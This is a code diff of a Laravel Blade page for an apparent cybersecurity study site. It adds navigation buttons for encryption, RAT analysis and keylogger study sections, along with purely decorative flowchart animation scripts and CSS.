-                    <div class="w-20 h-20 bg-gradient-to-r from-yellow-500 to-orange-500 rounded-full flex items-center justify-center mx-auto mb-4 border-4 border-yellow-400/30">
-                        <i class="fas fa-chart-bar text-white text-xl"></i>
-                    </div>
-                    <h4 class="text-yellow-400 font-semibold mb-2">Data Analysis</h4>
-                    <p class="text-gray-300 text-xs">Statistical analysis and pattern recognition of results</p>
-                    <div class="mt-4">
-                        <i class="fas fa-arrow-right text-gray-500 text-xl"></i>
-                    </div>
-                </div>
-
-                <!-- Step 5 -->
-                <div class="text-center">
-                    <div class="w-20 h-20 bg-gradient-to-r from-green-500 to-emerald-500 rounded-full flex items-center justify-center mx-auto mb-4 border-4 border-green-400/30">
-                        <i class="fas fa-file-alt text-white text-xl"></i>
-                    </div>
-                    <h4 class="text-green-400 font-semibold mb-2">Documentation</h4>
-                    <p class="text-gray-300 text-xs">Comprehensive reporting and knowledge sharing</p>
-                </div>
-            </div>
-        </div>
-
-        <!-- Technical Implementation Stack -->
-        <div class="bg-white/5 backdrop-blur-sm rounded-2xl p-8 border border-teal-500/20">
-            <h3 class="text-2xl font-bold text-white mb-8 text-center">Technical Implementation Stack</h3>
-            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
-                <!-- Frontend -->
-                <div class="bg-gray-800/50 rounded-lg p-6">
-                    <div class="flex items-center mb-4">
-                        <i class="fas fa-palette text-blue-400 text-xl mr-3"></i>
-                        <h4 class="text-blue-400 font-semibold">Frontend</h4>
-                    </div>
-                    <ul class="text-gray-300 text-sm space-y-2">
-                        <li>• HTML5 & CSS3</li>
-                        <li>• Tailwind CSS</li>
-                        <li>• JavaScript ES6+</li>
-                        <li>• Responsive Design</li>
-                    </ul>
-                </div>
-
-                <!-- Backend -->
-                <div class="bg-gray-800/50 rounded-lg p-6">
-                    <div class="flex items-center mb-4">
-                        <i class="fas fa-server text-red-400 text-xl mr-3"></i>
-                        <h4 class="text-red-400 font-semibold">Backend</h4>
-                    </div>
-                    <ul class="text-gray-300 text-sm space-y-2">
-                        <li>• Laravel PHP</li>
-                        <li>• RESTful APIs</li>
-                        <li>• MySQL Database</li>
-                        <li>• Authentication</li>
-                    </ul>
-                </div>
-
-                <!-- Security Tools -->
-                <div class="bg-gray-800/50 rounded-lg p-6">
-                    <div class="flex items-center mb-4">
-                        <i class="fas fa-shield-alt text-green-400 text-xl mr-3"></i>
-                        <h4 class="text-green-400 font-semibold">Security Tools</h4>
-                    </div>
-                    <ul class="text-gray-300 text-sm space-y-2">
-                        <li>• Malware Analysis</li>
-                        <li>• Encryption Libraries</li>
-                        <li>• Network Monitoring</li>
-                        <li>• Vulnerability Assessment</li>
-                    </ul>
-                </div>
-
-                <!-- Development -->
-                <div class="bg-gray-800/50 rounded-lg p-6">
-                    <div class="flex items-center mb-4">
-                        <i class="fas fa-code text-purple-400 text-xl mr-3"></i>
-                        <h4 class="text-purple-400 font-semibold">Development</h4>
-                    </div>
-                    <ul class="text-gray-300 text-sm space-y-2">
-                        <li>• Version Control (Git)</li>
-                        <li>• Testing Framework</li>
-                        <li>• CI/CD Pipeline</li>
-                        <li>• Documentation</li>
-                    </ul>
-                </div>
+            <div class="flex justify-center space-x-4">
+                <button onclick="showSection('encryption')" class="bg-emerald-600 hover:bg-emerald-700 text-white px-6 py-3 rounded-lg font-semibold transition-all duration-300 transform hover:scale-105">
+                    <i class="fas fa-lock mr-2"></i>Explore Encryption
+                </button>
+                <button onclick="showSection('rat-analysis')" class="bg-purple-600 hover:bg-purple-700 text-white px-6 py-3 rounded-lg font-semibold transition-all duration-300 transform hover:scale-105">
+                    <i class="fas fa-search mr-2"></i>Analyze RAT
+                </button>
+                <button onclick="showSection('snake-keylogger')" class="bg-red-600 hover:bg-red-700 text-white px-6 py-3 rounded-lg font-semibold transition-all duration-300 transform hover:scale-105">
+                    <i class="fas fa-keyboard mr-2"></i>Study Keylogger
+                </button>
             </div>
         </div>
     </section></section>
@@ -1487,21 +2198,22 @@
             });
         }, { threshold: 0.1 });
 
-        animateElements.forEach(element => observer.observe(element));        // Add keyboard shortcuts
+        animateElements.forEach(element => observer.observe(element));
+        // Add keyboard shortcuts
         document.addEventListener('keydown', function(event) {
             if (event.ctrlKey || event.metaKey) {
                 switch(event.key) {
                     case '1':
-                        event.preventDefault();
-                        window.location.href = "{{ route('nexus.encryption') }}";
+                         event.preventDefault();
+                window.location.href = "{{ route('nexus.encryption') }}";
                         break;
                     case '2':
                         event.preventDefault();
-                        window.location.href = "{{ route('nexus.rat-analysis') }}";
+                        showSection('rat-analysis');
                         break;
                     case '3':
                         event.preventDefault();
-                        window.location.href = "{{ route('nexus.snake-keylogger') }}";
+                        showSection('snake-keylogger');
                         break;
                     case '4':
                         event.preventDefault();
@@ -1806,8 +2518,415 @@
         const sizes = ['Bytes', 'KB', 'MB', 'GB'];
         const i = Math.floor(Math.log(bytes) / Math.log(k));
         return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
+    }    // All encryption functionality removed - available on dedicated encryption page
+    
+    // ===============================
+    // INTERACTIVE FLOWCHART FUNCTIONALITY
+    // ===============================
+    
+    // Flowchart Mode Switching
+    function activateFlowchartMode(mode) {
+        // Hide all flowchart modes
+        document.querySelectorAll('.flowchart-mode').forEach(section => {
+            section.classList.add('hidden');
+        });
+        
+        // Show selected mode
+        const targetSection = document.getElementById(`${mode}-flowchart`);
+        if (targetSection) {
+            targetSection.classList.remove('hidden');
+            
+            // Add activation animation
+            targetSection.style.opacity = '0';
+            targetSection.style.transform = 'translateY(20px)';
+            setTimeout(() => {
+                targetSection.style.transition = 'opacity 0.8s ease, transform 0.8s ease';
+                targetSection.style.opacity = '1';
+                targetSection.style.transform = 'translateY(0)';
+            }, 100);
+        }
+        
+        // Update active button
+        document.querySelectorAll('.flowchart-mode-btn').forEach(btn => {
+            btn.classList.remove('bg-emerald-600/40', 'bg-cyan-600/40', 'bg-purple-600/40');
+            btn.classList.add('bg-emerald-600/20', 'bg-cyan-600/20', 'bg-purple-600/20');
+        });
+        
+        // Highlight active button
+        event.target.classList.add('ring-2', 'ring-emerald-400/50');
+        setTimeout(() => {
+            event.target.classList.remove('ring-2', 'ring-emerald-400/50');
+        }, 1000);
     }
-
-    // All encryption functionality removed - available on dedicated encryption page
+    
+    // Initialize Neural Network Animation
+    function initializeNeuralNetwork() {
+        // Animate neural connections
+        const connections = document.querySelectorAll('.neural-connection');
+        connections.forEach((connection, index) => {
+            setTimeout(() => {
+                connection.classList.add('animate-pulse');
+            }, index * 200);
+        });
+        
+        // Pulse effect for active nodes
+        const nodes = document.querySelectorAll('.neural-node');
+        nodes.forEach(node => {
+            node.addEventListener('mouseenter', function() {
+                this.querySelector('.data-stream').style.animation = 'dataFlow 2s infinite linear';
+            });
+        });
+    }
+    
+    // Initialize Timeline Animations
+    function initializeTimeline() {
+        const timelineItems = document.querySelectorAll('.timeline-item');
+        const observer = new IntersectionObserver((entries) => {
+            entries.forEach(entry => {
+                if (entry.isIntersecting) {
+                    entry.target.style.opacity = '1';
+                    entry.target.style.transform = 'translateX(0)';
+                }
+            });
+        });
+        
+        timelineItems.forEach(item => {
+            item.style.opacity = '0';
+            item.style.transform = 'translateX(-50px)';
+            item.style.transition = 'opacity 0.8s ease, transform 0.8s ease';
+            observer.observe(item);
+        });
+    }
+    
+    // Interactive Neural Network Effects
+    document.addEventListener('DOMContentLoaded', function() {
+        // Initialize neural network on page load
+        setTimeout(() => {
+            activateFlowchartMode('neural');
+            initializeNeuralNetwork();
+            initializeTimeline();
+        }, 500);
+        
+        // Add hover effects to neural connections
+        document.querySelectorAll('.neural-connection').forEach(connection => {
+            connection.addEventListener('mouseenter', function() {
+                const indicator = this.querySelector('.connection-indicator');
+                if (indicator) {
+                    indicator.style.animation = 'pulse 1s infinite';
+                }
+            });
+            
+            connection.addEventListener('mouseleave', function() {
+                const indicator = this.querySelector('.connection-indicator');
+                if (indicator) {
+                    indicator.style.animation = '';
+                }
+            });
+        });
+        
+        // Animate architecture components
+        document.querySelectorAll('.architecture-component').forEach((component, index) => {
+            component.addEventListener('mouseenter', function() {
+                this.style.transform = 'translateY(-5px) scale(1.02)';
+                this.style.boxShadow = '0 10px 25px rgba(0, 255, 255, 0.2)';
+            });
+            
+            component.addEventListener('mouseleave', function() {
+                this.style.transform = 'translateY(0) scale(1)';
+                this.style.boxShadow = '';
+            });
+        });
+        
+        // Particle system animation
+        const particles = document.querySelectorAll('.particle');
+        particles.forEach((particle, index) => {
+            particle.style.animationDelay = `${index * 0.5}s`;
+        });
+    });
 </script>
+
+<style>
+/* ===============================
+   INTERACTIVE FLOWCHART STYLES
+   =============================== */
+
+/* Particle System */
+.particle-system {
+    position: relative;
+    width: 100%;
+    height: 100%;
+}
+
+.particle {
+    position: absolute;
+    width: 4px;
+    height: 4px;
+    background: linear-gradient(45deg, #10b981, #06b6d4);
+    border-radius: 50%;
+    animation: particleFloat 6s infinite ease-in-out;
+}
+
+.particle-1 { top: 10%; left: 15%; animation-delay: 0s; }
+.particle-2 { top: 30%; right: 20%; animation-delay: 1.2s; }
+.particle-3 { bottom: 40%; left: 25%; animation-delay: 2.4s; }
+.particle-4 { top: 60%; right: 15%; animation-delay: 3.6s; }
+.particle-5 { bottom: 20%; left: 60%; animation-delay: 4.8s; }
+
+@keyframes particleFloat {
+    0%, 100% { transform: translateY(0px) scale(1); opacity: 0.7; }
+    25% { transform: translateY(-20px) scale(1.1); opacity: 1; }
+    50% { transform: translateY(-10px) scale(0.9); opacity: 0.8; }
+    75% { transform: translateY(-30px) scale(1.05); opacity: 0.9; }
+}
+
+/* Neural Network Grid */
+.neural-grid {
+    background-image: 
+        linear-gradient(rgba(16, 185, 129, 0.1) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(16, 185, 129, 0.1) 1px, transparent 1px);
+    background-size: 50px 50px;
+    width: 100%;
+    height: 100%;
+    animation: gridFlow 20s infinite linear;
+}
+
+@keyframes gridFlow {
+    0% { transform: translate(0, 0); }
+    100% { transform: translate(50px, 50px); }
+}
+
+/* NEXUS Core Animation */
+@keyframes pulse-glow {
+    0%, 100% { 
+        box-shadow: 0 0 20px rgba(16, 185, 129, 0.5), 0 0 40px rgba(6, 182, 212, 0.3); 
+    }
+    50% { 
+        box-shadow: 0 0 30px rgba(16, 185, 129, 0.8), 0 0 60px rgba(6, 182, 212, 0.6); 
+    }
+}
+
+@keyframes spin-slow {
+    from { transform: rotate(0deg); }
+    to { transform: rotate(360deg); }
+}
+
+@keyframes reverse-spin {
+    from { transform: rotate(360deg); }
+    to { transform: rotate(0deg); }
+}
+
+.animate-pulse-glow { animation: pulse-glow 3s ease-in-out infinite; }
+.animate-spin-slow { animation: spin-slow 10s linear infinite; }
+.animate-reverse-spin { animation: reverse-spin 15s linear infinite; }
+
+/* Neural Connections */
+.neural-connection {
+    position: relative;
+    padding: 12px;
+    border-radius: 8px;
+    transition: all 0.3s ease;
+    background: rgba(31, 41, 55, 0.5);
+    border: 1px solid rgba(75, 85, 99, 0.3);
+}
+
+.neural-connection:hover {
+    background: rgba(31, 41, 55, 0.8);
+    border-color: rgba(16, 185, 129, 0.5);
+    transform: translateX(5px);
+}
+
+.connection-indicator {
+    position: absolute;
+    left: -6px;
+    top: 50%;
+    transform: translateY(-50%);
+    width: 12px;
+    height: 12px;
+    border-radius: 50%;
+    background: rgba(75, 85, 99, 0.5);
+    border: 2px solid rgba(16, 185, 129, 0.3);
+}
+
+.connection-indicator.active {
+    background: #10b981;
+    border-color: #10b981;
+    box-shadow: 0 0 10px rgba(16, 185, 129, 0.5);
+    animation: pulse 2s infinite;
+}
+
+.connection-indicator.pending {
+    background: rgba(251, 191, 36, 0.3);
+    border-color: #fbbf24;
+    animation: blink 1.5s infinite;
+}
+
+@keyframes blink {
+    0%, 50% { opacity: 1; }
+    51%, 100% { opacity: 0.3; }
+}
+
+/* Data Streams */
+.data-stream {
+    position: absolute;
+    width: 2px;
+    height: 20px;
+    background: linear-gradient(to bottom, transparent, #10b981, transparent);
+    opacity: 0.7;
+}
+
+.stream-1 {
+    top: 20%;
+    left: 10%;
+    animation: dataFlow 3s infinite linear;
+}
+
+.stream-2 {
+    top: 50%;
+    right: 15%;
+    animation: dataFlow 4s infinite linear reverse;
+}
+
+.stream-3 {
+    bottom: 30%;
+    left: 30%;
+    animation: dataFlow 2.5s infinite linear;
+}
+
+@keyframes dataFlow {
+    0% { transform: translateY(-100px); opacity: 0; }
+    10% { opacity: 0.7; }
+    90% { opacity: 0.7; }
+    100% { transform: translateY(100px); opacity: 0; }
+}
+
+/* Connection Lines */
+.connection-line {
+    position: absolute;
+    width: 2px;
+    height: 100px;
+    background: linear-gradient(to bottom, transparent, rgba(16, 185, 129, 0.5), transparent);
+    top: -50px;
+    left: 50%;
+    transform: translateX(-50%);
+    opacity: 0.6;
+}
+
+.connection-to-center::before {
+    content: '';
+    position: absolute;
+    top: -20px;
+    left: 50%;
+    transform: translateX(-50%);
+    width: 0;
+    height: 0;
+    border-left: 5px solid transparent;
+    border-right: 5px solid transparent;
+    border-bottom: 10px solid rgba(16, 185, 129, 0.5);
+}
+
+/* Quantum Field Effects */
+.quantum-field {
+    background: radial-gradient(circle at 30% 20%, rgba(147, 51, 234, 0.1) 0%, transparent 50%),
+                radial-gradient(circle at 70% 80%, rgba(236, 72, 153, 0.1) 0%, transparent 50%);
+    width: 100%;
+    height: 100%;
+    animation: quantumShift 8s infinite ease-in-out;
+}
+
+@keyframes quantumShift {
+    0%, 100% { transform: scale(1) rotate(0deg); }
+    50% { transform: scale(1.05) rotate(180deg); }
+}
+
+/* Game Particles */
+.game-particles {
+    background: 
+        radial-gradient(circle at 20% 30%, rgba(6, 182, 212, 0.1) 0%, transparent 40%),
+        radial-gradient(circle at 80% 70%, rgba(20, 184, 166, 0.1) 0%, transparent 40%),
+        radial-gradient(circle at 50% 50%, rgba(16, 185, 129, 0.05) 0%, transparent 60%);
+    width: 100%;
+    height: 100%;
+    animation: gameShimmer 6s infinite ease-in-out;
+}
+
+@keyframes gameShimmer {
+    0%, 100% { opacity: 0.3; transform: scale(1); }
+    50% { opacity: 0.6; transform: scale(1.02); }
+}
+
+/* Progress Bars Animation */
+@keyframes pulse-bright {
+    0%, 100% { box-shadow: 0 0 5px rgba(16, 185, 129, 0.5); }
+    50% { box-shadow: 0 0 15px rgba(16, 185, 129, 0.8); }
+}
+
+.animate-pulse-bright { animation: pulse-bright 2s ease-in-out infinite; }
+
+/* Timeline Styles */
+.timeline-node {
+    position: relative;
+    z-index: 10;
+}
+
+.timeline-item {
+    position: relative;
+}
+
+/* Architecture Components */
+.architecture-component {
+    transition: all 0.3s ease;
+}
+
+.architecture-component:hover {
+    transform: translateY(-5px) scale(1.02);
+    box-shadow: 0 10px 25px rgba(0, 255, 255, 0.2);
+}
+
+/* Metric Cards */
+.metric-card {
+    transition: all 0.3s ease;
+}
+
+.metric-card:hover {
+    transform: scale(1.05);
+    box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
+}
+
+/* Neural Stats */
+.neural-stat {
+    transition: all 0.3s ease;
+}
+
+.neural-stat:hover {
+    transform: translateY(-3px);
+    box-shadow: 0 8px 20px rgba(16, 185, 129, 0.2);
+}
+
+/* Responsive Design */
+@media (max-width: 768px) {
+    .neural-grid { background-size: 30px 30px; }
+    .particle { width: 3px; height: 3px; }
+    .connection-line { height: 60px; top: -30px; }
+}
+
+/* Dark mode enhancements */
+.flowchart-mode {
+    backdrop-filter: blur(20px);
+    border: 1px solid rgba(255, 255, 255, 0.1);
+}
+
+/* Interactive hover states */
+.neural-node:hover .data-stream {
+    animation-duration: 1s !important;
+}
+
+.neural-node:hover .connection-indicator {
+    transform: translateY(-50%) scale(1.2);
+}
+
+/* Smooth transitions */
+* {
+    transition: transform 0.3s ease, opacity 0.3s ease, box-shadow 0.3s ease;
+}
+</style>
 @endsection
